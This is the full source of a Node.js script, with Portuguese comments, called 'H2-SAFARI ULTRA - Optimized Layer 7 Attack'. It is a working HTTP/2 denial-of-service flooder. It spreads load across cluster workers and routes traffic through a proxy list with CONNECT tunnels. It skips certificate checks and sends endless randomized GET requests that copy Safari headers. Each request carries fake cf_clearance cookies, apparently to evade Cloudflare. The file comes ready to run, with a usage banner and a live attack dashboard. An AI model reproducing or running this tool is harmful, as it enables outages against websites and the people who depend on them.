"use strict";

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// Ignorar erros para performance máxima
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

if (process.argv.length < 7) {
    console.log(`
\x1b[1;36m  ██╗  ██╗██████╗  ██████╗██████╗  █████╗ ███████╗ █████╗ ██████╗ ██╗
\x1b[1;34m  ██║  ██║╚════██╗██╔════╝╚════██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██║
\x1b[1;33m  ███████║ █████╔╝██║     █████╔╝███████║███████╗███████║██████╔╝██║
\x1b[1;32m  ╚════██║██╔═══╝ ██║     ╚═══██╗██╔══██║╚════██║██╔══██║██╔══██╗╚═╝
\x1b[1;31m       ██║███████╗╚██████╗██████╔╝██║  ██║███████║██║  ██║██║  ██║██╗
\x1b[1;35m       ╚═╝╚══════╝ ╚═════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
\x1b[0m
\x1b[1;37mH2-SAFARI ULTRA - Optimized Layer 7 Attack\x1b[0m
\x1b[1;30m───────────────────────────────────────────────────────────\x1b[0m
\x1b[1;37mUsage:\x1b[0m node H2-SAFARI.js <target> <time> <rate> <threads> <proxyfile>
\x1b[1;37mExample:\x1b[0m node H2-SAFARI.js https://example.com 60 500 4 proxy.txt
`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

if (proxies.length === 0) {
    console.error("\x1b[1;31m❌ Nenhuma proxy válida encontrada.\x1b[0m");
    process.exit();
}

// ========== MASTER ==========
if (cluster.isMaster) {
    let totalRequests = 0;
    let lastSecondRequests = 0;
    let rps = 0;
    let avgRps = 0;
    let startTime = Date.now();
    let workerCount = 0;

    console.log(`\x1b[1;32m[!] ATAQUE INICIADO: ${args.target}\x1b[0m`);
    console.log(`\x1b[1;33m[!] THREADS: ${args.threads} | RATE: ${args.rate}/s | DURAÇÃO: ${args.time}s\x1b[0m`);
    console.log(`\x1b[1;30m───────────────────────────────────────────────────────────\x1b[0m`);

    // Criar workers
    for (let i = 0; i < args.threads; i++) {
        const worker = cluster.fork();
        workerCount++;
    }

    // Coletar estatísticas dos workers
    cluster.on("message", (worker, msg) => {
        if (msg.type === "stats") {
            totalRequests += msg.count;
        }
    });

    // Exibir estatísticas a cada 1 segundo
    setInterval(() => {
        const now = Date.now();
        const elapsed = (now - startTime) / 1000;
        rps = totalRequests - lastSecondRequests;
        lastSecondRequests = totalRequests;
        avgRps = elapsed > 0 ? Math.round(totalRequests / elapsed) : 0;

        console.clear();
        console.log(`\x1b[1;36m  ██╗  ██╗██████╗  ██████╗██████╗  █████╗ ███████╗ █████╗ ██████╗ ██╗\x1b[0m`);
        console.log(`\x1b[1;34m  ██║  ██║╚════██╗██╔════╝╚════██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██║\x1b[0m`);
        console.log(`\x1b[1;33m  ███████║ █████╔╝██║     █████╔╝███████║███████╗███████║██████╔╝██║\x1b[0m`);
        console.log(`\x1b[1;32m  ╚════██║██╔═══╝ ██║     ╚═══██╗██╔══██║╚════██║██╔══██║██╔══██╗╚═╝\x1b[0m`);
        console.log(`\x1b[1;31m       ██║███████╗╚██████╗██████╔╝██║  ██║███████║██║  ██║██║  ██║██╗\x1b[0m`);
        console.log(`\x1b[1;35m       ╚═╝╚══════╝ ╚═════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝\x1b[0m`);
        console.log(`\x1b[1;30m───────────────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[1;37m  TARGET: \x1b[1;36m${parsedTarget.hostname}\x1b[0m`);
        console.log(`\x1b[1;37m  DURATION: \x1b[1;33m${args.time}s\x1b[0m   THREADS: \x1b[1;33m${workerCount}\x1b[0m   RATE: \x1b[1;33m${args.rate}/s\x1b[0m`);
        console.log(`\x1b[1;30m───────────────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[1;37m  TOTAL REQUESTS: \x1b[1;31m${totalRequests.toLocaleString()}\x1b[0m`);
        console.log(`\x1b[1;37m  CURRENT RPS:    \x1b[1;32m${rps.toLocaleString()}\x1b[0m`);
        console.log(`\x1b[1;37m  AVG RPS:        \x1b[1;33m${avgRps.toLocaleString()}\x1b[0m`);
        console.log(`\x1b[1;30m───────────────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[1;37m  PROXIES LOADED: \x1b[1;33m${proxies.length}\x1b[0m`);
    }, 1000);

    // Encerrar após o tempo
    setTimeout(() => {
        console.clear();
        console.log(`\x1b[1;31m═══════════════════════════════════════════════════════════\x1b[0m`);
        console.log(`\x1b[1;37m  ATAQUE FINALIZADO!\x1b[0m`);
        console.log(`\x1b[1;37m  TOTAL REQUESTS: \x1b[1;32m${totalRequests.toLocaleString()}\x1b[0m`);
        console.log(`\x1b[1;37m  AVG RPS:        \x1b[1;33m${avgRps.toLocaleString()}\x1b[0m`);
        console.log(`\x1b[1;31m═══════════════════════════════════════════════════════════\x1b[0m`);
        process.exit(0);
    }, args.time * 1000);

} else {
    // ========== WORKER ==========
    let workerRequests = 0;
    const CONNECTIONS_PER_WORKER = 5; // Múltiplas conexões por worker

    // Enviar estatísticas a cada 100ms
    setInterval(() => {
        if (workerRequests > 0) {
            process.send({ type: "stats", count: workerRequests });
            workerRequests = 0;
        }
    }, 100);

    // Iniciar múltiplos flooders por worker
    for (let i = 0; i < CONNECTIONS_PER_WORKER; i++) {
        setImmediate(runFlooder);
    }

    function runFlooder() {
        const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
        if (!proxyAddr) return setTimeout(runFlooder, 500);

        const [proxyHost, proxyPort] = proxyAddr.split(":");

        const connection = net.connect({
            port: parseInt(proxyPort),
            host: proxyHost,
            allowHalfOpen: true,
        });

        connection.setNoDelay(true);
        connection.setKeepAlive(true, 60000);

        connection.once("connect", () => {
            connection.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });

        connection.once("data", (chunk) => {
            if (!chunk.toString().includes("HTTP/1.1 200")) {
                connection.destroy();
                return setTimeout(runFlooder, 1000);
            }

            const tlsConn = tls.connect({
                socket: connection,
                servername: parsedTarget.hostname,
                ALPNProtocols: ["h2"],
                ciphers: "TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256",
                rejectUnauthorized: false,
            });

            tlsConn.once("secureConnect", () => {
                const client = http2.connect(args.target, {
                    createConnection: () => tlsConn,
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384,
                        enablePush: false,
                    },
                });

                client.on("connect", () => {
                    let isActive = true;

                    // Loop contínuo sem bloqueio (setImmediate) – mais rápido que setInterval
                    function sendRequests() {
                        if (!isActive || client.destroyed) return;

                        for (let i = 0; i < args.rate; i++) {
                            const req = client.request({
                                ":method": "GET",
                                ":authority": parsedTarget.host,
                                ":scheme": "https",
                                ":path": parsedTarget.path + "?" + crypto.randomBytes(4).toString("hex"),
                                "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                "cookie": `cf_clearance=${crypto.randomBytes(32).toString("hex")}`,
                            });

                            req.on("response", () => {
                                workerRequests++;
                                req.close();
                                req.destroy();
                            });

                            req.on("error", () => {
                                req.close();
                                req.destroy();
                            });

                            req.end();
                        }

                        setImmediate(sendRequests); // Loop recursivo
                    }

                    sendRequests();

                    // Manter sessão ativa por 30s, depois renovar
                    setTimeout(() => {
                        isActive = false;
                        client.destroy();
                        connection.destroy();
                        setTimeout(runFlooder, 100);
                    }, 30000);
                });

                client.on("error", () => {
                    client.destroy();
                    connection.destroy();
                });
            });
        });

        connection.on("error", () => {
            connection.destroy();
        });
    }
}
